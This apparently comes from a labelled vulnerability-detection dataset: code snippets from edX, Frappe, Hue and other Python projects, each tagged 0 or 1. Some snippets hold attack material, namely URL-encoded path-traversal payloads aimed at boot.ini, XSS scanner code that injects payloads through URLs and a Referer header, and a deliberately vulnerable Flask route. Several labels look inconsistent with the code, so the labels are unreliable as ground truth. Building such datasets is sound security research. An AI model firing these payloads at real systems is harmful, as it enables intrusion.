settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE", "label": 0}, {"snippet_id": 44866, "code": " @check_document_access_permission() def workflow_parameters(request): response={'status': -1} try: workflow=Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))", "label": 0}, {"snippet_id": 13597, "code": "', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$", "label": 0}, {"snippet_id": 22496, "code": "'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{", "label": 0}, {"snippet_id": 2383, "code": " parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid", "label": 0}, {"snippet_id": 15148, "code": ".test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console", "label": 0}, {"snippet_id": 43694, "code": "\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname", "label": 0}, {"snippet_id": 35605, "code": ".fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for", "label": 0}, {"snippet_id": 30480, "code": " %s:00/,/ %s:00/! d' |tail -%s %s %s\" %(serv, date, date1, rows, grep_act, grep)] \t\tsyslog_server=sql.get_setting('syslog_server') \t \tif waf==\"1\": \t\tlocal_path_logs='/var/log/modsec_audit.log' \t\tcommands", "label": 0}, {"snippet_id": 51850, "code": "':{ '()': 'colorlog.ColoredFormatter', 'format': '%(log_color)s%(asctime)s\\t%(levelname)-8s -' '%(message)s', 'datefmt': '%Y-%m-%d %H:%M', 'log_colors':{ 'DEBUG': 'green', 'INFO': 'white', 'WARNING': 'yellow", "label": 0}, {"snippet_id": 14706, "code": "}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{", "label": 0}, {"snippet_id": 36474, "code": ": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", ", "label": 0}, {"snippet_id": 46727, "code": "'claimable_benefits': Benefit.objects.find_claimable(selected_flags), }) class BenefitDetailView(DetailView): model=Benefit template_name='core/benefit_detail.html' def get_context_data(self, *args, **kwargs", "label": 0}, {"snippet_id": 616, "code": "/'+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) xss_result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\"", "label": 1}, {"snippet_id": 22859, "code": "'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=", "label": 1}, {"snippet_id": 26790, "code": "%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00'", "label": 0}, {"snippet_id": 32676, "code": " has_a_single_h1=(len([line for line in contents.splitlines() if(line.startswith(' not line.startswith(' md.treeprocessors['adjust_toc']=_AdjustTOC(has_a_single_h1) md_fragment=md.convert(contents).encode(", "label": 0}, {"snippet_id": 52474, "code": "['status']=0 response['properties']=properties response['workflows']=workflows return HttpResponse(json.dumps(response), mimetype=\"application/json\") def _get_workflows(user): return[{ 'name': workflow", "label": 0}, {"snippet_id": 9392, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 39869, "code": " docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, ", "label": 0}, {"snippet_id": 2972, "code": "\"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else", "label": 0}, {"snippet_id": 30492, "code": ".get_setting('syslog_server') \t \tif waf==\"1\": \t\tlocal_path_logs='/var/log/modsec_audit.log' \t\tcommands=[ \"sudo cat %s |tail -%s %s %s\" %(local_path_logs, rows, grep_act, grep)]\t \t\t \tfunct.ssh_command(syslog_server", "label": 0}, {"snippet_id": 24934, "code": " pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course", "label": 0}, {"snippet_id": 36614, "code": "(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') ", "label": 0}, {"snippet_id": 49852, "code": " render_template, request from. import bp as app @app.route(\"/\") def root(): return render_template(\"home.html\") @app.route(\"/interact\", methods=[\"POST\"]) def vuln(): msg=request.form[\"message\"].replace('img'", "label": 1}, {"snippet_id": 10299, "code": "}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string", "label": 0}, {"snippet_id": 19150, "code": "\"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS", "label": 0}, {"snippet_id": 8717, "code": "'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$", "label": 0}, {"snippet_id": 13970, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 21088, "code": ", url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware", "label": 0}, {"snippet_id": 50528, "code": " requests coming in from the ajax client. The requests should be tagged with different modes depending on what needs to be done, such as initializing or sending/receving data through the request. It uses", "label": 0}, {"snippet_id": 25759, "code": " label=q.question, required=q.required, help_text=help_text, widget=forms.Textarea, initial=initial.answer if initial else None, ) elif q.type==Question.TYPE_CHOICE: field=forms.ModelChoiceField( queryset=q", "label": 0}, {"snippet_id": 27597, "code": " not user_email: self.redirect(login_url) return contact_string=db_config.get_value('contact_string') template_values={ 'message': message, 'user_email': helpers.get_user_email(), 'login_url': login_url", "label": 0}, {"snippet_id": 46152, "code": " return index(request, True) def new_search(request): engine=request.GET.get('engine', 'solr') collections=get_engine(request.user, engine).datasets() if not collections: return no_collections(request)", "label": 0}, {"snippet_id": 33426, "code": ".xeger(\"((\\%3C)|<)((\\%69)|i|(\\%49))((\\%6D)|m|(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\") \t\t\tif any(x in _payload for x in \"\\\"'><;/\"): \t\t\t\treturn _payload \tdef check(self, url, payload, response, parameter", "label": 1}, {"snippet_id": 43190, "code": "(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype", "label": 0}, {"snippet_id": 44172, "code": " from django.core.urlresolvers import reverse from django.forms.formsets import formset_factory from django.http import HttpResponse from django.shortcuts import redirect from django.utils.translation import", "label": 0}, {"snippet_id": 6694, "code": "') @property def dashboard_link(self): \"\"\" URL(string) for use in simple templating of forbidden.html. \"\"\" return self.config.get(self.section, 'dashboard_link') @property def password_reset_link(self)", "label": 0}, {"snippet_id": 13265, "code": "(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views", "label": 0}, {"snippet_id": 54244, "code": "='light sky blue').grid(row=8) Label(main, text=\"\",background='light sky blue').grid(row=9) Label(main, text=\"\",background='light sky blue').grid(row=10) ua=[\"\"] ua+=bane.ua li=bane.read_file('xss.txt'", "label": 0}, {"snippet_id": 36788, "code": " \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1", "label": 0}, {"snippet_id": 17998, "code": "=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings", "label": 0}, {"snippet_id": 21413, "code": " name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P", "label": 0}, {"snippet_id": 19552, "code": " pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh", "label": 0}, {"snippet_id": 9324, "code": "/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name", "label": 0}, {"snippet_id": 40794, "code": ".get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe", "label": 0}, {"snippet_id": 18019, "code": "),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views", "label": 0}, {"snippet_id": 8061, "code": "/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch", "label": 0}, {"snippet_id": 14485, "code": " urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views", "label": 0}, {"snippet_id": 10090, "code": "=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite", "label": 0}, {"snippet_id": 27153, "code": "]*name=\"(\\w+)\"', line, re.M|re.I) if m_input: m_value=re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I) if m_value: hidden_param_name.append(m_input.group(2)) hidden_param_value.append", "label": 1}, {"snippet_id": 3296, "code": " dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update", "label": 1}, {"snippet_id": 16526, "code": ".course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 26171, "code": ".invoice_address_company_required and not self.all_optional: self.fields['name_parts'].widget.attrs['data-required-if']=' self.fields['name_parts'].widget.attrs['data-no-required-attr']='1' self.fields['company']", "label": 0}, {"snippet_id": 43825, "code": " has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif", "label": 0}, {"snippet_id": 8109, "code": "<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(", "label": 0}, {"snippet_id": 19234, "code": "): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py", "label": 0}, {"snippet_id": 21809, "code": "*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings", "label": 0}, {"snippet_id": 24445, "code": ".testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self", "label": 0}, {"snippet_id": 23210, "code": "/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications", "label": 0}, {"snippet_id": 44302, "code": "=Workflow(document=doc) else: doc=None workflow=Workflow() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) workflow_data=workflow.get_data() api=get_oozie(request.user", "label": 0}, {"snippet_id": 22806, "code": "/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"", "label": 1}, {"snippet_id": 30999, "code": "('interface') \tvrrpip=form.getvalue('vrrpip') \ttmp_config_path=sql.get_setting('tmp_config_path') \tscript=\"install_keepalived.sh\" \t \tif form.getvalue('hap')==\"1\": \t\tfunct.install_haproxy(master) \t\tfunct", "label": 0}, {"snippet_id": 31703, "code": "=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists') \ttry: \t\tfile=open(list, \"r\") \t\tfile_read=file.read() \t", "label": 0}, {"snippet_id": 25185, "code": " InvoiceAddress, Question from pretix.base.models.tax import EU_COUNTRIES from pretix.base.settings import PERSON_NAME_SCHEMES from pretix.base.templatetags.rich_text import rich_text from pretix.control", "label": 0}, {"snippet_id": 24376, "code": " to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation", "label": 0}, {"snippet_id": 8648, "code": "', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete", "label": 0}, {"snippet_id": 24308, "code": " test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest", "label": 0}, {"snippet_id": 4450, "code": ", 'd': '\\u0501', 'e': '\\u0435', 'h': '\\u04BB', 'i': '\\u0456', 'j': '\\u0458', 'l': '\\u04CF', 'o': '\\u043E', 'p': '\\u0440', 'r': '\\u0433', 'q': '\\u051B', 's': '\\u0455', 'w': '\\u051D', 'x': '\\u0445', 'y':", "label": 0}, {"snippet_id": 43048, "code": "\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row", "label": 0}, {"snippet_id": 7022, "code": "), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user',", "label": 0}, {"snippet_id": 14112, "code": ".combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>", "label": 0}, {"snippet_id": 43405, "code": "\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(", "label": 0}, {"snippet_id": 21043, "code": ".end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki", "label": 0}, {"snippet_id": 50407, "code": " mode_receive(self, request): \"\"\" This is called by render_POST when the client is telling us that it is ready to receive data as soon as it is available. This is the basis of a long-polling(comet) mechanism: the", "label": 0}, {"snippet_id": 52473, "code": " response['status']=0 response['properties']=properties response['workflows']=workflows return HttpResponse(json.dumps(response), mimetype=\"application/json\") def _get_workflows(user): return[{ 'name':", "label": 0}, {"snippet_id": 19919, "code": ".get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None)", "label": 0}, {"snippet_id": 39314, "code": "=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t", "label": 0}, {"snippet_id": 40178, "code": "\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t", "label": 0}, {"snippet_id": 53129, "code": " response['id']=coordinator_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_coordinator(request): response={'status': -1} coordinator_dict", "label": 0}, {"snippet_id": 23916, "code": "'VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo'", "label": 1}, {"snippet_id": 45790, "code": " }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_bundle(request, bundle, properties): try: deployment_mapping={} coords=dict([(c.uuid, c)", "label": 0}, {"snippet_id": 34559, "code": "\t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype", "label": 0}, {"snippet_id": 37133, "code": "(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t", "label": 0}, {"snippet_id": 13619, "code": "'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 54724, "code": " form_valid(self, form): a=form.save(commit=False) a.author=self.request.user a.article=self.object a.save() return super().form_valid(form) def is_mobile(useragent): devices=[\"Android\", \"iPhone\", \"SymbianOS\"", "label": 0}, {"snippet_id": 54918, "code": "\"\"\"Update stats on a list of TranslatedResource. \"\"\" projects=set() for translated_resource in translated_resources: projects.add(translated_resource.resource.project) translated_resource.calculate_stats", "label": 0}, {"snippet_id": 37840, "code": ", global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on", "label": 1}, {"snippet_id": 2848, "code": "\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers", "label": 0}, {"snippet_id": 54774, "code": " **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT']) return context def form_valid(self, form): a=form.save(commit=False) a.author", "label": 0}, {"snippet_id": 29873, "code": "\"]) \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') \t\t if form.getvalue('getcert') is not None and serv is not None: \tid=form.getvalue('getcert'", "label": 0}, {"snippet_id": 26381, "code": " self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country returned an incorrect result. We will therefore ' 'need to charge VAT", "label": 0}, {"snippet_id": 25686, "code": "=forms.CheckboxInput() if initial: initialbool=(initial.answer==\"True\") else: initialbool=False field=forms.BooleanField( label=q.question, required=q.required, help_text=help_text, initial=initialbool", "label": 1}, {"snippet_id": 6433, "code": " self.config.get(self.section, 'server_key') @property def cert_chain(self): \"\"\" SSL certificate chain filename \"\"\" return self.config.get(self.section, 'cert_chain') @property def userdb_mongo_uri(self): ", "label": 0}, {"snippet_id": 13701, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/", "label": 1}, {"snippet_id": 4026, "code": "+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload", "label": 0}, {"snippet_id": 22500, "code": "\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images", "label": 0}, {"snippet_id": 12124, "code": ".course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index", "label": 1}, {"snippet_id": 53359, "code": "[('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,", "label": 0}, {"snippet_id": 18432, "code": "\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$", "label": 0}, {"snippet_id": 9222, "code": ".html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses", "label": 1}, {"snippet_id": 41590, "code": " display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"", "label": 0}, {"snippet_id": 6206, "code": " number of cores(if hyperthreading is available). \"\"\" return self.config.getint(self.section, 'num_threads') @property def logdir(self): \"\"\" Path to CherryPy logfiles(string). Something like '/var/log/idp", "label": 0}, {"snippet_id": 47397, "code": "+profile.authuser.username +'\"</h3>')) f.add_content(PlainText('<a href=\"/admin/media/select?action_url=/admin/actions/change-user-avatar' '&payload=' +str(user_id) +'\"><img class=\"button-img\" alt=\"Change", "label": 0}, {"snippet_id": 879, "code": " if 'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result=", "label": 1}, {"snippet_id": 17436, "code": "'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate", "label": 0}, {"snippet_id": 47189, "code": "): \"\"\"Test flask-admin interace.\"\"\" admin=Admin(app, name=\"Test\") assert 'model' in record_adminview assert 'modelview' in record_adminview model=record_adminview.pop('model') view=record_adminview.pop", "label": 0}, {"snippet_id": 36924, "code": "\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children():", "label": 0}, {"snippet_id": 7961, "code": " name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 18204, "code": "\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=", "label": 0}, {"snippet_id": 18556, "code": "]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems", "label": 0}, {"snippet_id": 42140, "code": " else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname]", "label": 0}, {"snippet_id": 11439, "code": "\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '", "label": 0}, {"snippet_id": 43504, "code": "\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn", "label": 0}, {"snippet_id": 41078, "code": "=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!", "label": 0}, {"snippet_id": 39743, "code": "\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch", "label": 0}, {"snippet_id": 13173, "code": "'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views", "label": 0}, {"snippet_id": 17629, "code": ", name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$", "label": 0}, {"snippet_id": 20736, "code": ", url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=", "label": 0}, {"snippet_id": 17227, "code": "[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]", "label": 0}, 